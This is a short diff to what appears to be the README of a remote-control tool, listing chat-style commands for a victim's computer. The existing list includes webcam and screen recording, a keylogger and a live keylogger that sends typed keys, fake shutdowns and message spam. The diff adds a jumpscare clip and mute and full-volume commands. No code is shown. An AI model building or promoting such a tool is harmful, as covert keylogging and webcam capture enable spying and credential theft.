@@ -21,6 +21,7 @@ plankton - Plankton.
 gabinetti - Gabinetti nella villa.
 webcamclip - Record webcam.  
 screenclip - Record screen.  
+recordjum - Records 20 second clip of jumpscare.
 messagebox - Show a custom message box.  
 messagespam - Spam message boxes.  
 fakeshutdown - Fake system shutdown.  
@@ -35,6 +36,8 @@ keylogger - Records pressed keys on keyboard.
 livekeylogger - Sends live updates about what's being typed on the keyboard.
 setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
+mute - Set computer's volume to 0.
+full - Set computer's volume to 100
 ```
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
